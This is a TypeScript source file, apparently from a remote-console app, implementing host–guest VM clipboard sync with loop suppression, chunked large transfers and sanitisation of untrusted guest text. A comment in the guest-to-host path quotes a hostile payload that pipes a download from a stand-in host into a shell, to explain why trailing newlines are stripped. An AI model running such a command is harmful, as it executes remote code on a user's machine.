/**
 * ClipboardEngine — the renderer's single source of truth for
 * clipboard transfers between host and guest VM.
 *
 * Host→Guest: consumes edge-triggered clipboard-change push events
 * from the main process (which watches the cross-platform OS clipboard,
 * not just the macOS NSPasteboard), then sends
 * RFB ClientCutText to QEMU. QEMU's clipboard subsystem (enabled by
 * the qemu-vdagent chardev with clipboard=on) forwards it to the
 * guest bridge via the ISA serial port.
 *
 * Guest→Host: the bridge agent sends a vdagent clipboard grab/data
 * via the serial port. QEMU translates it to Extended Clipboard
 * ServerCutText on the VNC stream. The proxy translates that to
 * legacy ServerCutText, which the renderer passes to
 * handleGuestClipboard → NSPasteboard.
 *
 * Loop-suppression: a per-instance Ledger keyed on (direction, hash,
 * format) drops true echoes without blocking legitimate round-trips.
 *
 * Multi-tab safety: each ConsoleView instantiates its own engine.
 */

import { createLedger, type Direction, type Ledger } from './Ledger';
import { sha256Hex } from './hash';
import { noopClipboardAudit, type ClipboardAuditEmit } from './audit';
import { sanitizeGuestText } from './sanitize';
import {
  BigClipboardSender,
  BigClipboardReceiver,
  BLOB_ACK_PREFIX,
  BLOB_FRAME_PREFIX,
  HELLO_PREFIX,
  HELLOACK_PREFIX,
  MIN_CHUNK_BYTES,
  frameChunkBytes,
} from './BigClipboard';

export interface ClipboardEngineOptions {
  /** Session ID used in audit records. Empty if not yet established. */
  sessionId: () => string;
  /** Optional typed audit emitter. Defaults to no-op. */
  audit?: ClipboardAuditEmit;
  pollIntervalMs?: number;
  /**
   * Forward host-pasteboard changes into the guest. Wired to sendClientCutText
   * which QEMU routes through the vdagent serial channel to the bridge daemon.
   * Returns whether the text was actually delivered (put on the wire); the
   * direct path gates its ledger/audit on this so a drop (RFB not ready) is not
   * recorded as a false success that would echo-suppress the reverse direction.
   * void/undefined is treated as delivered (backward-compatible with test mocks).
   */
  forwardHostToVM?: (text: string) => boolean | void | Promise<boolean | void>;
  /**
   * Surface a clipboard FAILURE to the UI (e.g. a toast / status pill).
   * Called when a transfer that the operator expects to have worked did not:
   * a host clipboard write failed, or a paste was too large to send. Vital
   * for a "must always work" channel — silent failures are the worst outcome.
   */
  onError?: (direction: Direction, message: string) => void;
  /**
   * Gate (read FRESHLY per paste, e.g. from a feature flag) for the reliable
   * large-paste path. When it returns true, a paste too big for the direct path
   * first probes the guest's receive capacity (the HELLO handshake) so the
   * sender uses a few big BCP frames instead of hundreds of tiny ones whose
   * per-frame ACKs contend on QEMU's single clipboard slot. OFF (default) ⇒
   * exactly today's behaviour. ONLY the large-paste path is affected; small
   * (direct) pastes are never touched.
   */
  reprobeCapacity?: () => boolean;
}

export interface ClipboardEngine {
  /**
   * Start consuming main-process clipboard-change push events
   * (edge-triggered, cross-platform OS clipboard). Returns a stop fn.
   */
  startHostPoll(): () => void;
  /**
   * Handle a ServerCutText payload received from the RFB stream
   * (guest → host). Loop-suppressed via the ledger; writes to the
   * OS pasteboard unless it would be a loop.
   */
  handleGuestClipboard(text: string): Promise<void>;
  /**
   * Forcibly clear the ledger — e.g. on session reconnect.
   */
  clearLedger(): void;
}

export function createClipboardEngine(opts: ClipboardEngineOptions): ClipboardEngine {
  const audit = opts.audit ?? noopClipboardAudit;
  void opts.pollIntervalMs; // polling moved to main process
  const ledger: Ledger = createLedger();

  // Last-seen host-pasteboard text — used only to detect *change*
  // on the host poll. Loop detection lives in the ledger; this is
  // just "did the operator copy something new since the last tick?"
  // It can be plain text because we never persist it outside this
  // closure and it's already in the OS pasteboard anyway.
  // lastHostText removed — seq-based detection handles change tracking.
  // Echo suppression is handled by the Ledger (30s window).

  const MAX_CLIPBOARD_BYTES = 10 * 1024 * 1024; // 10 MB

  const emit = (direction: Direction, hash: string, bytes: number, truncated: boolean) => {
    audit({
      direction,
      hash,
      bytes,
      format: 'text/plain',
      ts: Date.now(),
      sessionId: opts.sessionId(),
      truncated,
    });
  };

  // Direct-path ceiling for a single host→guest ClientCutText. The binding limit
  // is NOT QEMU's 1 MiB caps — it's how large a burst the GUEST's serial receive
  // path can absorb, which was ~4 KB in the field until the agent started sizing
  // its receive queue (see the agent's serial_windows.go / serial_drain.go).
  // A direct paste is one un-chunked message, so it must fit that budget on ANY
  // guest — including one whose agent predates the HELLO handshake and never
  // reports a capacity. 2 KB keeps the everyday copy (URLs, snippets) on the
  // zero-overhead direct path; anything larger goes through BCP, whose frames
  // ARE sized to the negotiated capacity.
  const DIRECT_MAX_BYTES = 2 * 1024;

  // Hard ceiling on a host→guest paste, via BCP. Matches the agent's
  // MaxClipboardSize (10 MB) — the receiver rejects anything larger.
  const MAX_HOST_TO_VM_BYTES = 10 * 1024 * 1024;

  // Negotiated host→guest frame size (see BigClipboard.frameChunkBytes and the
  // agent's hello.go). Starts at the conservative floor and only grows once the
  // guest reports the receive capacity its OS actually granted — so a guest
  // whose agent predates the handshake, or whose driver clamped the queue, keeps
  // working at today's size instead of having frames silently dropped.
  let chunkBytes = MIN_CHUNK_BYTES;

  // True once the guest has answered a HELLO with its receive capacity
  // (applyHelloAck). Gates the lazy pre-paste capacity probe below so it runs at
  // most once per session (until answered).
  let helloAcked = false;
  // Resolver for an in-flight lazy probe, fulfilled by applyHelloAck or a timeout.
  let helloWaiter: (() => void) | null = null;
  // At most one capacity probe per session, shared by concurrent large pastes:
  // a guest that never answers a HELLO (legacy agent, or a dead guest→host rail)
  // must not re-stall EVERY large paste for HELLO_PROBE_WAIT_MS. Reset on
  // reconnect (clearLedger) so a fresh stream re-probes.
  let probePromise: Promise<void> | null = null;

  // Bounded wait for the HELLOACK on a lazy probe. The HELLOACK rides the
  // guest→host grab side-channel; probing right before a large paste (when that
  // rail is otherwise idle) is when it is most likely to land. On timeout we
  // proceed at whatever frame size we have — never worse than today.
  const HELLO_PROBE_WAIT_MS = 2000;

  // BCP sender rides the SAME sink as the direct path — its frames are
  // ordinary small ClientCutTexts. Created once per engine (per console).
  const bcp = new BigClipboardSender(
    (frameText) => {
      void opts.forwardHostToVM?.(frameText);
    },
    { chunkBytes: () => chunkBytes },
  );

  /**
   * Ask the guest how much it can absorb. Unanswered by design on an old agent —
   * we simply stay at MIN_CHUNK_BYTES. Rides the raw sink (no sanitize/ledger).
   */
  const sendHello = () => {
    void opts.forwardHostToVM?.(HELLO_PREFIX);
  };

  /** Apply a guest's HELLOACK: __AHVRC_HELLOACK__v1:<ver>:<os>:<rxCapacity> */
  const applyHelloAck = (text: string) => {
    const [ver, os, rxRaw] = text.slice(HELLOACK_PREFIX.length).split(':');
    const rx = Number(rxRaw);
    if (!Number.isFinite(rx) || rx <= 0) return;
    chunkBytes = frameChunkBytes(rx);
    helloAcked = true;
    // Release a lazy probe waiting on this ack (it nulls helloWaiter itself).
    if (helloWaiter) helloWaiter();
    // eslint-disable-next-line no-console
    console.log(
      '[clipboard.caps] guest reported rx_capacity=%d → frame=%d bytes (agent %s on %s)',
      rx,
      chunkBytes,
      ver ?? '?',
      os ?? '?',
    );
  };

  /**
   * A transfer whose frames never landed means the guest cannot actually absorb
   * what it advertised (a driver silently clamping its queue, say). Halve and
   * retry rather than failing the operator's paste: the reported capacity is a
   * claim, and this is what verifies it.
   */
  const demoteChunkBytes = (): boolean => {
    if (chunkBytes <= MIN_CHUNK_BYTES) return false;
    chunkBytes = Math.max(MIN_CHUNK_BYTES, Math.floor(chunkBytes / 2));
    console.warn('[clipboard.caps] large frames did not land — demoting to %d bytes', chunkBytes);
    return true;
  };

  /**
   * Learn the guest's receive capacity BEFORE a large paste, so the sender uses
   * big frames (few frames, few ACKs) rather than the MIN_CHUNK_BYTES floor
   * (hundreds of frames whose ACKs storm the single clipboard slot). Sends one
   * HELLO and waits a bounded time for the HELLOACK. No-op once already
   * answered; on timeout the caller simply proceeds at the current frame size —
   * identical to today's behaviour. Callers gate this on reprobeCapacity().
   */
  const probeCapacity = (): Promise<void> => {
    if (helloAcked) return Promise.resolve();
    // A probe is already in flight (or was already run this session) — share it.
    // Once it settles, later large pastes see either helloAcked (big frames) or
    // this resolved promise (proceed immediately at the current size, no re-stall).
    if (probePromise) return probePromise;
    probePromise = new Promise<void>((resolve) => {
      sendHello();
      const timer = setTimeout(() => {
        // HELLOACK never arrived within the window — proceed at the current
        // frame size (never worse than today's frame size).
        helloWaiter = null;
        resolve();
      }, HELLO_PROBE_WAIT_MS);
      helloWaiter = () => {
        clearTimeout(timer);
        helloWaiter = null;
        resolve();
      };
    });
    return probePromise;
  };

  /**
   * Push host text into the guest via ClientCutText. Ledger entry is
   * recorded BEFORE the await so a fast guest→host echo poll within
   * the window doesn't bounce the same text back.
   */
  const forwardHostToVM = async (text: string) => {
    if (text === '') return;

    // Normalize CRLF → LF on the way to the guest. Windows hosts (and
    // Excel/Word even on macOS) put \r\n; the guest agent re-expands LF→CRLF
    // as needed. A single canonical wire format keeps both sides predictable.
    const normalized = text.replace(/\r\n?/g, '\n');

    const { cleaned, stripped } = sanitizeGuestText(normalized);
    if (stripped > 0) {
      console.warn('[clipboard.host_to_vm] sanitized %d dangerous char(s)', stripped);
    }
    if (cleaned === '') return;

    const byteLen = new TextEncoder().encode(cleaned).length;
    if (byteLen > MAX_HOST_TO_VM_BYTES) {
      console.warn(
        '[clipboard.host_to_vm] paste too large (%d bytes > %d) — NOT sent (exceeds the agent-side payload cap)',
        byteLen,
        MAX_HOST_TO_VM_BYTES,
      );
      opts.onError?.(
        'host_to_vm',
        `Clipboard is too large to paste into the VM (${Math.round(byteLen / (1024 * 1024))} MB; limit ${MAX_HOST_TO_VM_BYTES / (1024 * 1024)} MB).`,
      );
      return;
    }

    // Loop-suppression hash is computed over the SAME canonical form the
    // guest→host path uses (sanitized, trailing newlines stripped), so a guest
    // echo of host-sent text is recognised and not bounced back.
    const hash = await sha256Hex(cleaned.replace(/\n+$/, ''));
    if (ledger.isLoop('host_to_vm', hash, 'text/plain')) return;

    const sink = opts.forwardHostToVM;
    if (!sink) return;

    // Large paste: Big-Clipboard Protocol (chunked/ACK-paced/gzip — see
    // BigClipboard.ts). Ledger + audit are recorded on COMPLETION, when the
    // agent confirmed the guest clipboard write — a multi-second transfer
    // recorded up-front could age out of the echo window before the guest
    // could even produce an echo.
    if (byteLen > DIRECT_MAX_BYTES) {
      // Reliable large-paste path (feature-flagged, read fresh per paste). Learn
      // the guest's capacity first so the sender uses a few big frames instead of
      // hundreds of tiny ones. Small/direct pastes never reach here, so this
      // cannot affect them.
      if (opts.reprobeCapacity?.()) {
        await probeCapacity();
      }
      let res = await bcp.submit(cleaned);
      // 'timeout' means frames are not reaching the guest at all — the classic
      // signature of a frame sized past what this guest can absorb. Demote and
      // retry once before telling the operator it failed.
      if (!res.ok && !res.superseded && res.error === 'timeout' && demoteChunkBytes()) {
        res = await bcp.submit(cleaned);
      }
      if (res.ok) {
        ledger.record('host_to_vm', hash, 'text/plain');
        emit('host_to_vm', hash, byteLen, false);
      } else if (!res.superseded) {
        console.warn('[clipboard.host_to_vm] large-paste transfer failed — %s', res.error);
        opts.onError?.('host_to_vm', `Failed to send large clipboard to the VM (${res.error}).`);
      }
      return;
    }

    // Confirm-before-advance: only record the loop-suppression ledger entry and
    // the success audit AFTER the sink confirms delivery. Recording up-front (the
    // old bug) both lost the paste on a not-ready RFB stream AND wrote a phantom
    // host_to_vm entry that echo-suppressed a genuine guest→host copy of the same
    // text — a cross-direction latch. void/undefined counts as delivered.
    let delivered: boolean;
    try {
      delivered = (await sink(cleaned)) !== false;
    } catch (err) {
      console.warn('[clipboard.host_to_vm] send failed — err=%o', err);
      delivered = false;
    }
    if (delivered) {
      ledger.record('host_to_vm', hash, 'text/plain');
      emit('host_to_vm', hash, byteLen, false);
    } else {
      console.warn(
        '[clipboard.host_to_vm] send dropped (console not ready) — not recorded, will re-fire',
      );
      opts.onError?.('host_to_vm', 'Clipboard could not be sent to the VM (console not ready).');
    }
  };

  /**
   * Deliver guest-origin text to the host clipboard — the SINGLE guest→host
   * write path, shared by direct ServerCutText and completed reverse-BCP
   * transfers so sanitize / loop-suppression / audit can never diverge.
   */
  const deliverGuestText = async (text: string): Promise<void> => {
    // Mirror the host→guest line-ending contract: collapse CRLF/CR to LF, then
    // strip TRAILING line break(s). The guest is untrusted; a payload like
    // "curl evil|sh\n" landing verbatim would AUTO-EXECUTE on paste into a host
    // terminal. Stripping the trailing newline keeps it in the input buffer and
    // forces a deliberate human Enter. Interior newlines are preserved.
    //
    // \n alone is NOT sufficient: a hostile guest could append a newline-
    // EQUIVALENT Unicode separator — U+2028, U+2029 or U+0085 — which many host
    // shells/editors also treat as a line break. sanitizeGuestText strips those
    // anywhere; we also strip them when trailing so the guarantee holds.
    const normalized = text.replace(/\r\n?/g, '\n').replace(/[\n\u0085\u2028\u2029]+$/, '');

    // Sanitize BEFORE hashing/dedup so the loop-suppression key matches the
    // host→guest path (which hashes the sanitized form). NEVER log the clipboard
    // text itself (invariant: only length/direction/sha256 may be logged).
    const { cleaned, stripped } = sanitizeGuestText(normalized);
    if (stripped > 0) {
      console.warn('[clipboard.guest_to_host] sanitized %d dangerous char(s)', stripped);
    }
    if (cleaned === '') {
      // eslint-disable-next-line no-console
      console.log('[clipboard.guest_to_host] empty after normalization/sanitization — ignored');
      return;
    }

    const hash = await sha256Hex(cleaned);
    if (ledger.isLoop('vm_to_host', hash, 'text/plain')) {
      // eslint-disable-next-line no-console
      console.log(
        '[clipboard.guest_to_host] LOOP-suppressed (echo of a just-sent host→guest paste) — sha=%s',
        hash.slice(0, 12),
      );
      return;
    }
    ledger.record('vm_to_host', hash, 'text/plain');

    const cleanedBytes = new TextEncoder().encode(cleaned).length;
    // The write IPC reports success/failure explicitly. A swallowed failure =
    // silent data loss (operator pastes stale content while the channel shows
    // green) — the worst outcome for a vital feature.
    const res = await window.ahvRemoteConsole.clipboardWrite(cleaned);
    if (res?.ok !== true) {
      const msg = res?.error ?? 'unknown error';
      console.warn(
        '[clipboard.guest_to_host] host clipboard write FAILED — bytes=%d err=%s',
        cleanedBytes,
        msg,
      );
      window.ahvRemoteConsole.hcLog('error', 'clipboard', `guest→host write failed: ${msg}`);
      opts.onError?.('vm_to_host', `Could not update the host clipboard: ${msg}`);
      // Do NOT emit a success audit — the paste did not land. Throw so a
      // reverse-BCP transfer ACKs err:write instead of done.
      throw new Error(msg);
    }
    emit('vm_to_host', hash, cleanedBytes, false);
  };

  // Reverse-BCP receiver: reassembles a large guest→host paste (mirror of the
  // agent's blobRx). Its ACKs ride the SAME raw sink as the sender's frames —
  // ordinary small host→guest ClientCutTexts, bypassing the engine's
  // sanitize/ledger wrapper.
  //
  // Note on bidirectional concurrency: a large host→guest paste (bcp sender) and
  // a large guest→host paste (bcpReceiver + agent sender) both ride the single
  // shared clipboard channel, which is last-writer-wins. If both run at once the
  // two stop-and-wait streams interleave and slow each other, but neither thrashes
  // forever — each side gives up after its bounded retries. Simultaneous large
  // transfers in BOTH directions are a rare operator action (pasting a big blob
  // into the guest at the same instant the guest copies a big blob out), and the
  // clipboard being a single shared resource means one would supersede the other
  // regardless; we accept the degraded-but-bounded behaviour rather than add a
  // cross-direction lock.
  const bcpReceiver = new BigClipboardReceiver(MAX_CLIPBOARD_BYTES, deliverGuestText, (ackText) => {
    void opts.forwardHostToVM?.(ackText);
  });

  return {
    startHostPoll() {
      // Main process polls the OS pasteboard (150ms) and pushes changes
      // via IPC. We subscribe here and forward instantly.
      //
      // Bootstrap the initial seq from main's CURRENT state before
      // subscribing. This way, any subsequent event with a seq strictly
      // greater than `baseline` is a real user copy and gets forwarded.
      // The previous approach (lastSeq = -1; drop first event) silently
      // discarded the operator's first Cmd+C, which the main-process
      // sig-dedup then prevented from re-firing — the "had to copy 3
      // times before paste worked" symptom in the field.
      let baseline = Number.POSITIVE_INFINITY;
      void window.ahvRemoteConsole.clipboardRead().then(({ seq }) => {
        baseline = seq;
      });
      // Ask the guest what it can absorb. Fire-and-forget: an agent too old to
      // answer leaves us at MIN_CHUNK_BYTES, which is exactly today's behaviour.
      sendHello();

      const unsub = window.ahvRemoteConsole.onClipboardChanged(({ text, seq }) => {
        // Defensive: if the IPC arrives before the baseline read resolves
        // (extremely unlikely — the read is local IPC), treat it as a
        // real event. The ledger's host_to_vm record will catch any
        // legitimate dedup.
        if (seq > baseline || baseline === Number.POSITIVE_INFINITY) {
          baseline = seq;
          void forwardHostToVM(text);
        }
      });
      return unsub;
    },

    async handleGuestClipboard(text) {
      // BCP acks ride the guest→host clipboard rail; route them to the sender
      // and never toward the host clipboard.
      if (text.startsWith(BLOB_ACK_PREFIX)) {
        bcp.onAckText(text);
        return;
      }
      // Reverse-BCP frames: chunks of a LARGE guest copy. Reassemble them; the
      // final frame delivers the payload via the shared deliverGuestText path.
      if (text.startsWith(BLOB_FRAME_PREFIX)) {
        await bcpReceiver.ingest(text);
        return;
      }
      // The guest answering our capability probe with its measured receive
      // capacity — never operator data, never reaches the host clipboard.
      if (text.startsWith(HELLOACK_PREFIX)) {
        applyHelloAck(text);
        return;
      }
      // Any other __AHVRC_ token here is a SIBLING console's side-channel
      // traffic echoed by QEMU's clipboard broadcast (its outbound blob
      // frames, keep-warm variants the proxy doesn't recognise, …). Never
      // operator data — dropping it must never reach the OS pasteboard.
      if (text.startsWith('__AHVRC_')) return;

      const bytes = new TextEncoder().encode(text).length;
      if (bytes > MAX_CLIPBOARD_BYTES) {
        console.warn(
          '[clipboard.guest_to_host] payload too large, rejected — bytes=%d max=%d',
          bytes,
          MAX_CLIPBOARD_BYTES,
        );
        return;
      }
      // Direct (small) guest→host copy: deliver via the shared path. Its throw
      // (a failed host write) is already logged and surfaced via onError inside
      // deliverGuestText — only the reverse-BCP sender needs the thrown signal.
      try {
        await deliverGuestText(text);
      } catch {
        /* already surfaced in deliverGuestText */
      }
    },

    clearLedger() {
      ledger.clear();
      // Reconnect/rfb_reset: an in-flight large transfer cannot complete on
      // the old stream — abort it so its retries stop immediately.
      bcp.cancel('reconnect');
      bcpReceiver.reset();
      // Let the next large paste re-probe capacity on the fresh stream (the guest
      // may have been re-provisioned). Settle any in-flight probe; leave
      // chunkBytes as-is so the flag-off path is byte-for-byte unchanged — a
      // re-probe updates it if the new guest reports a different capacity.
      helloAcked = false;
      probePromise = null;
      if (helloWaiter) helloWaiter();
    },
  };
}
